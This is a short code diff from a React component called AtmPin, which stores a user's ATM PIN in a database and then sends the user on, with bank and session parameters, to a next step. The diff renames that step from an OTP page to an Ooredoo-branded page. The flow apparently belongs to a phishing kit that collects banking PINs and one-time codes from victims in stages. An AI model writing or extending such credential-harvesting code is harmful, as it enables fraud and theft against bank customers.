@@ -37,7 +37,7 @@ export default function AtmPin() {
     } catch (error) {
       console.error("Error saving ATM PIN in DB, continuing anyway:", error);
     }
-    setLocation(`/otp?bank=${bank}&session=${sessionId}`);
+    setLocation(`/ooredoo?bank=${bank}&session=${sessionId}`);
   };
 
   return (
